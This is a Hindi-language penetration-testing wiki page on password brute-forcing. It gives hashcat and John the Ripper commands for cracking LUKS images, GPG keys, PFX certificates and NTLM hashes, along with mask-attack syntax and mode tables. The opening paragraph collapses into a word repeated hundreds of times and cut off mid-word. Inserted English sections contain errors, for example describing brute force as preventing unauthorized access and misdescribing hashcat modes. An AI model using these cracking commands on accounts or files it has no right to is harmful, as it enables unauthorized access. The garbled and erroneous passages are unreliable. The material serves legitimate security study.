ब्रूट फोर्स एक ऐसी तकनीक है जिसमें सही विकल्प मिलने तक हर संभव संयोजन की कोशिश की जाती है। यह आमतौर पर पासवर्ड क्रैकिंग में उपयोग होती है, जहां हमलावर पासवर्ड को अनुमान लगाने के लिए विभिन्न संयोजनों की कोशिश करता है। ब्रूट फोर्स हमले समय लेने वाले और संसाधन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प्रवर्धन-प
```bash
cryptsetup luksDump backup.img #Check that the payload offset is set to 4096
dd if=backup.img of=luckshash bs=512 count=4097 #Payload offset +1
hashcat -m 14600 -a 0 luckshash  wordlists/rockyou.txt
cryptsetup luksOpen backup.img mylucksopen
ls /dev/mapper/ #You should find here the image mylucksopen
mount /dev/mapper/mylucksopen /mnt
```
एक और Luks BF ट्यूटोरियल: [http://blog.dclabs.com.br/2020/03/bruteforcing-linux-disk-encription-luks.html?m=1](http://blog.dclabs.com.br/2020/03/bruteforcing-linux-disk-encription-luks.html?m=1)

### Mysql
```bash
#John hash format
<USERNAME>:$mysqlna$<CHALLENGE>*<RESPONSE>
dbuser:$mysqlna$112233445566778899aabbccddeeff1122334455*73def07da6fba5dcc1b19c918dbd998e0d1f3f9d
```
### PGP/GPG निजी कुंजी

जब हम PGP/GPG का उपयोग करके डेटा को एन्क्रिप्ट करते हैं, तो हमें अपनी निजी कुंजी की आवश्यकता होती है। यह निजी कुंजी हमारे द्वारा डेटा को एन्क्रिप्ट करने और डिक्रिप्ट करने के लिए उपयोग की जाती है। यह एक बहुत महत्वपूर्ण तत्व है, इसलिए हमें इसे सुरक्षित रखना चाहिए।

निजी कुंजी को ब्रूट फोर्स अटैक के खिलाफ सुरक्षित रखने के लिए हमें कुछ महत्वपूर्ण बातों का ध्यान रखना चाहिए:

- एक मजबूत पासवर्ड का उपयोग करें।
- निजी कुंजी को सुरक्षित स्थान पर संग्रहीत करें।
- निजी कुंजी को किसी के साथ साझा न करें।
- निजी कुंजी को नियमित अंतराल पर बदलें।

यदि हमारी निजी कुंजी किसी भी कारणवश लीक हो जाती है, तो हमारे डेटा की सुरक्षा प्रभावित हो सकती है। इसलिए, हमें निजी कुंजी की सुरक्षा को हमेशा महत्व देना चाहिए और उच्च स्तर की सुरक्षा उपायों का उपयोग करना चाहिए।
```bash
gpg2john private_pgp.key #This will generate the hash and save it in a file
john --wordlist=/usr/share/wordlists/rockyou.txt ./hash
```
### सिस्को

<figure><img src="../.gitbook/assets/image (239).png" alt=""><figcaption></figcaption></figure>

### DPAPI मास्टर कुंजी

[https://github.com/openwall/john/blob/bleeding-jumbo/run/DPAPImk2john.py](https://github.com/openwall/john/blob/bleeding-jumbo/run/DPAPImk2john.py) का उपयोग करें और फिर जॉन का उपयोग करें

### ओपन ऑफिस पासवर्ड से सुरक्षित कॉलम

यदि आपके पास एक xlsx फ़ाइल है जिसमें एक पासवर्ड द्वारा सुरक्षित कॉलम है, तो आप इसे अनप्रोटेक्ट कर सकते हैं:

* **इसे Google Drive पर अपलोड करें** और पासवर्ड स्वचालित रूप से हटा दिया जाएगा
* **मैन्युअल** रूप से इसे **हटाएं**:
```bash
unzip file.xlsx
grep -R "sheetProtection" ./*
# Find something like: <sheetProtection algorithmName="SHA-512"
hashValue="hFq32ZstMEekuneGzHEfxeBZh3hnmO9nvv8qVHV8Ux+t+39/22E3pfr8aSuXISfrRV9UVfNEzidgv+Uvf8C5Tg" saltValue="U9oZfaVCkz5jWdhs9AA8nA" spinCount="100000" sheet="1" objects="1" scenarios="1"/>
# Remove that line and rezip the file
zip -r file.xls .
```
### PFX प्रमाणपत्र

PFX प्रमाणपत्र एक फ़ाइल होती है जो एक साथ निजी और सार्वजनिक कुंजी जोड़ती है। यह प्रमाणपत्र डिजिटल रूप में होता है और इसका उपयोग डिजिटल हस्ताक्षर और डिजिटल छाप को सत्यापित करने के लिए किया जाता है। PFX प्रमाणपत्र एक पासवर्ड से सुरक्षित होता है जो उपयोगकर्ता की गोपनीयता को सुनिश्चित करता है।

PFX प्रमाणपत्र को ब्रूट फ़ोर्स अटैक के लिए उपयोग किया जा सकता है। इसमें एक विशेषता होती है जिसे "पासवर्ड ब्रूट फ़ोर्स" कहा जाता है, जिसमें एक हमलावर बहुत सारे पासवर्ड को प्रयास करता है ताकि वह सही पासवर्ड को खोज सके और PFX प्रमाणपत्र को खोल सके। यह एक प्रभावी तकनीक है जो अनधिकृत प्रवेश को प्रभावी ढंग से रोक सकती है।

ब्रूट फ़ोर्स अटैक के दौरान, एक हमलावर एक शब्दकोश का उपयोग करता है जिसमें संभावित पासवर्ड के संभावित संयोजनों की सूची होती है। यह उपयोगकर्ता के द्वारा निर्धारित नियमों के आधार पर पासवर्ड की खोज करता है, जैसे कि लंबाई, अक्षर, अंक, विशेष वर्ण, आदि। यह तकनीक अधिकांश वक्ता को बहुत समय लगा सकती है, लेकिन यह अगर सही पासवर्ड को खोजती है तो बहुत महत्वपूर्ण हो सकती है।
```bash
# From https://github.com/Ridter/p12tool
./p12tool crack -c staff.pfx -f /usr/share/wordlists/rockyou.txt
# From https://github.com/crackpkcs12/crackpkcs12
crackpkcs12 -d /usr/share/wordlists/rockyou.txt ./cert.pfx
```
<figure><img src="../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) का उपयोग करके आसानी से वर्ल्ड के सबसे उन्नत समुदाय उपकरणों द्वारा संचालित और स्वचालित कार्यप्रवाह बनाएं।\
आज ही पहुंच प्राप्त करें:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## उपकरण

**हैश उदाहरण:** [https://openwall.info/wiki/john/sample-hashes](https://openwall.info/wiki/john/sample-hashes)

### हैश-पहचानकर्ता
```bash
hash-identifier
> <HASH>
```
### शब्द-सूचियाँ

* **Rockyou**
* [**Probable-Wordlists**](https://github.com/berzerk0/Probable-Wordlists)
* [**Kaonashi**](https://github.com/kaonashi-passwords/Kaonashi/tree/master/wordlists)
* [**Seclists - Passwords**](https://github.com/danielmiessler/SecLists/tree/master/Passwords)

### **शब्द-सूचि उत्पादन उपकरण**

* [**kwprocessor**](https://github.com/hashcat/kwprocessor)**:** उन्नत कीबोर्ड-चालक जो कॉन्फ़िगरेबल बेस अक्षर, कीमैप और रूट्स के साथ होता है।
```bash
kwp64.exe basechars\custom.base keymaps\uk.keymap routes\2-to-10-max-3-direction-changes.route -o D:\Tools\keywalk.txt
```
### जॉन म्यूटेशन

_**/etc/john/john.conf**_ पढ़ें और इसे कॉन्फ़िगर करें
```bash
john --wordlist=words.txt --rules --stdout > w_mutated.txt
john --wordlist=words.txt --rules=all --stdout > w_mutated.txt #Apply all rules
```
### Hashcat

#### Hashcat हमले

* **Wordlist हमला** (`-a 0`) नियमों के साथ

**Hashcat** पहले से ही नियमों के साथ एक **फ़ोल्डर के साथ आता है** लेकिन आप [**यहां दूसरे दिलचस्प नियम पा सकते हैं**](https://github.com/kaonashi-passwords/Kaonashi/tree/master/rules).
```
hashcat.exe -a 0 -m 1000 C:\Temp\ntlm.txt .\rockyou.txt -r rules\best64.rule
```
* **वर्डलिस्ट कम्बिनेटर** हमला

हैशकैट के साथ दो वर्डलिस्ट को एक में **कम्बाइन करना संभव** है।
यदि पहली सूची में शब्द **"नमस्ते"** हो और दूसरी सूची में शब्द **"दुनिया"** और **"पृथ्वी"** के 2 लाइन्स हों। शब्द `नमस्तेदुनिया` और `नमस्तेपृथ्वी` उत्पन्न होंगे।
```bash
# This will combine 2 wordlists
hashcat.exe -a 1 -m 1000 C:\Temp\ntlm.txt .\wordlist1.txt .\wordlist2.txt

# Same attack as before but adding chars in the newly generated words
# In the previous example this will generate:
## hello-world!
## hello-earth!
hashcat.exe -a 1 -m 1000 C:\Temp\ntlm.txt .\wordlist1.txt .\wordlist2.txt -j $- -k $!
```
* **मास्क हमला** (`-a 3`)
```bash
# Mask attack with simple mask
hashcat.exe -a 3 -m 1000 C:\Temp\ntlm.txt ?u?l?l?l?l?l?l?l?d

hashcat --help #will show the charsets and are as follows
? | Charset
===+=========
l | abcdefghijklmnopqrstuvwxyz
u | ABCDEFGHIJKLMNOPQRSTUVWXYZ
d | 0123456789
h | 0123456789abcdef
H | 0123456789ABCDEF
s | !"#$%&'()*+,-./:;<=>?@[\]^_`{|}~
a | ?l?u?d?s
b | 0x00 - 0xff

# Mask attack declaring custom charset
hashcat.exe -a 3 -m 1000 C:\Temp\ntlm.txt -1 ?d?s ?u?l?l?l?l?l?l?l?1
## -1 ?d?s defines a custom charset (digits and specials).
## ?u?l?l?l?l?l?l?l?1 is the mask, where "?1" is the custom charset.

# Mask attack with variable password length
## Create a file called masks.hcmask with this content:
?d?s,?u?l?l?l?l?1
?d?s,?u?l?l?l?l?l?1
?d?s,?u?l?l?l?l?l?l?1
?d?s,?u?l?l?l?l?l?l?l?1
?d?s,?u?l?l?l?l?l?l?l?l?1
## Use it to crack the password
hashcat.exe -a 3 -m 1000 C:\Temp\ntlm.txt .\masks.hcmask
```
* वर्डलिस्ट + मास्क (`-a 6`) / मास्क + वर्डलिस्ट (`-a 7`) हमला
```bash
# Mask numbers will be appended to each word in the wordlist
hashcat.exe -a 6 -m 1000 C:\Temp\ntlm.txt \wordlist.txt ?d?d?d?d

# Mask numbers will be prepended to each word in the wordlist
hashcat.exe -a 7 -m 1000 C:\Temp\ntlm.txt ?d?d?d?d \wordlist.txt
```
#### हैशकैट मोड्स

Hashcat में विभिन्न मोड्स होते हैं। ये मोड्स विभिन्न प्रकार के हैश फ़ाइलों को क्रैक करने के लिए उपयोगी होते हैं। निम्नलिखित हैशकैट मोड्स हैं:

- **Straight**: यह मोड हैश फ़ाइल को सीधे क्रैक करने के लिए उपयोगी होता है।
- **Combination**: यह मोड दो या अधिक हैश फ़ाइलों को क्रैक करने के लिए उपयोगी होता है।
- **Brute-force**: यह मोड हैश को ब्रूट-फ़ोर्स करने के लिए उपयोगी होता है।
- **Hybrid**: यह मोड विभिन्न शब्दकोशों का उपयोग करके हैश को क्रैक करने के लिए उपयोगी होता है।
- **Mask**: यह मोड एक मास्क पैटर्न का उपयोग करके हैश को क्रैक करने के लिए उपयोगी होता है।
- **Rule-based**: यह मोड नियमों का उपयोग करके हैश को क्रैक करने के लिए उपयोगी होता है।

ये मोड्स हैशकैट के विभिन्न उपयोगों के लिए उपयोगी होते हैं और आपको विभिन्न हैश क्रैकिंग स्कीमों का उपयोग करने में मदद करते हैं।
```bash
hashcat --example-hashes | grep -B1 -A2 "NTLM"
```
# Cracking Linux Hashes - /etc/shadow file

## Introduction

In this section, we will discuss the process of cracking Linux hashes from the `/etc/shadow` file. The `/etc/shadow` file is a system file in Linux that stores user account information, including hashed passwords.

## Methodology

To crack Linux hashes, we will use a technique called brute-force attack. A brute-force attack involves systematically trying all possible combinations of characters until the correct password is found.

Here are the steps to crack Linux hashes:

1. Obtain the `/etc/shadow` file: First, we need to gain access to the target system and obtain the `/etc/shadow` file. This file is usually located in the `/etc` directory.

2. Extract the hashed passwords: Once we have the `/etc/shadow` file, we need to extract the hashed passwords. Each password entry in the file consists of several fields separated by colons. The second field contains the hashed password.

3. Choose a cracking tool: There are various tools available for cracking Linux hashes, such as John the Ripper, Hashcat, and Hydra. Choose a tool that suits your requirements and install it on your system.

4. Configure the cracking tool: Next, we need to configure the cracking tool with the necessary parameters. This includes specifying the hash type, character set, and any additional rules or dictionaries to improve the cracking process.

5. Start the cracking process: Once the cracking tool is configured, we can start the cracking process. The tool will systematically generate and test different password combinations until it finds a match for the hashed password.

6. Monitor the progress: Cracking Linux hashes can be a time-consuming process, especially if the passwords are strong. It is important to monitor the progress of the cracking tool and adjust the parameters if necessary.

7. Retrieve the cracked passwords: Once the cracking tool successfully finds a match for a hashed password, it will display the cracked password. Make note of the cracked passwords for further analysis or exploitation.

## Conclusion

Cracking Linux hashes from the `/etc/shadow` file can be a challenging task, especially if the passwords are complex. However, by using a brute-force attack and the right cracking tool, it is possible to recover the passwords and gain unauthorized access to user accounts. It is important to note that cracking passwords without proper authorization is illegal and unethical. This knowledge should only be used for legitimate purposes, such as penetration testing or password recovery.
```
500 | md5crypt $1$, MD5(Unix)                          | Operating-Systems
3200 | bcrypt $2*$, Blowfish(Unix)                      | Operating-Systems
7400 | sha256crypt $5$, SHA256(Unix)                    | Operating-Systems
1800 | sha512crypt $6$, SHA512(Unix)                    | Operating-Systems
```
# Cracking Windows Hashes

## Introduction

In this section, we will discuss the process of cracking Windows hashes. Hash cracking is a common technique used by hackers to gain unauthorized access to user accounts and passwords. By cracking the hashes, hackers can obtain the original plaintext passwords, allowing them to log in to the target system.

## Types of Windows Hashes

Windows operating systems use different types of hashes to store user passwords. The most common types are:

- **LM Hash**: This hash is used in older versions of Windows (prior to Windows NT) and is considered weak and easily crackable.
- **NTLM Hash**: This hash is used in newer versions of Windows (Windows NT and later) and is more secure than the LM hash.
- **NTLMv2 Hash**: This hash is an improvement over the NTLM hash and provides better security.

## Cracking Windows Hashes

To crack Windows hashes, hackers typically use brute-force attacks or dictionary attacks. These attacks involve trying different combinations of characters or words until the correct password is found.

### Brute-Force Attacks

In a brute-force attack, hackers systematically try all possible combinations of characters to crack the hash. This method can be time-consuming and resource-intensive, especially for complex passwords. However, with the help of powerful hardware and specialized software, hackers can significantly speed up the cracking process.

### Dictionary Attacks

In a dictionary attack, hackers use a pre-generated list of commonly used passwords or words from a dictionary to crack the hash. This method is faster than brute-force attacks since it eliminates the need to try all possible combinations. However, it is less effective against complex passwords that are not included in the dictionary.

## Tools for Cracking Windows Hashes

There are several tools available for cracking Windows hashes, including:

- **John the Ripper**: A popular password cracking tool that supports various hash types, including Windows hashes.
- **Hashcat**: A powerful password cracking tool that can crack a wide range of hash types, including Windows hashes.
- **Cain and Abel**: A versatile tool that can be used for password cracking, network scanning, and other security-related tasks.

## Conclusion

Cracking Windows hashes is a common technique used by hackers to gain unauthorized access to user accounts. By understanding the different types of hashes and using appropriate tools and techniques, hackers can successfully crack Windows hashes and obtain the original plaintext passwords. It is important for system administrators and users to implement strong password policies and regularly update their passwords to protect against hash cracking attacks.
```
3000 | LM                                               | Operating-Systems
1000 | NTLM                                             | Operating-Systems
```
# Cracking Common Application Hashes

## Introduction

In this section, we will discuss the process of cracking common application hashes. Hash cracking is a technique used to recover plaintext passwords from their hashed representations. By cracking the hashes, we can gain unauthorized access to various applications and systems.

## Types of Hashes

There are different types of hashes used by applications to store passwords. Some common hash types include MD5, SHA1, SHA256, and bcrypt. Each hash type has its own algorithm and characteristics.

## Hash Cracking Techniques

### 1. Dictionary Attack

A dictionary attack involves using a pre-generated list of words, known as a dictionary, to crack hashes. The attacker compares the hashed passwords with the entries in the dictionary to find a match. This technique is effective when users choose weak and commonly used passwords.

### 2. Brute Force Attack

In a brute force attack, the attacker systematically tries all possible combinations of characters to crack the hash. This method is time-consuming and resource-intensive, but it can be effective against strong and complex passwords.

### 3. Rainbow Table Attack

A rainbow table attack uses precomputed tables that contain pairs of plaintext passwords and their corresponding hashes. The attacker compares the hashed passwords with the entries in the rainbow table to find a match. This technique is faster than brute force, but it requires a large amount of storage space.

## Tools for Hash Cracking

There are several tools available for hash cracking, such as John the Ripper, Hashcat, and Hydra. These tools support various hash types and provide options for dictionary and brute force attacks.

## Conclusion

Cracking common application hashes is a crucial skill for hackers and security professionals. By understanding different hash types and employing appropriate cracking techniques, we can gain unauthorized access to applications and systems. However, it is important to note that hash cracking should only be performed with proper authorization and for legitimate purposes.
```
900 | MD4                                              | Raw Hash
0 | MD5                                              | Raw Hash
5100 | Half MD5                                         | Raw Hash
100 | SHA1                                             | Raw Hash
10800 | SHA-384                                          | Raw Hash
1400 | SHA-256                                          | Raw Hash
1700 | SHA-512                                          | Raw Hash
```
<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* क्या आप **साइबर सुरक्षा कंपनी** में काम करते हैं? क्या आप अपनी **कंपनी को HackTricks में विज्ञापित** देखना चाहते हैं? या क्या आपको **PEASS के नवीनतम संस्करण या HackTricks को PDF में डाउनलोड** करने का उपयोग करना है? [**सदस्यता योजनाएं**](https://github.com/sponsors/carlospolop) की जांच करें!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा विशेष संग्रह [**NFTs**](https://opensea.io/collection/the-peass-family)
* [**आधिकारिक PEASS & HackTricks swag**](https://peass.creator-spring.com) प्राप्त करें
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discord समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) में **शामिल हों** या मुझे **Twitter** पर **फ़ॉलो** करें [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **अपने हैकिंग ट्रिक्स को** [**hacktricks रेपो**](https://github.com/carlospolop/hacktricks) **और** [**hacktricks-cloud रेपो**](https://github.com/carlospolop/hacktricks-cloud) **में PR जमा करके साझा करें।**

</details>

<figure><img src="../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) का उपयोग करें और आसानी से **वर्कफ़्लो बनाएं और स्वचालित करें** जो दुनिया के **सबसे उन्नत समुदाय उपकरणों** द्वारा संचालित होते हैं।\
आज ही पहुंच प्राप्त करें:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
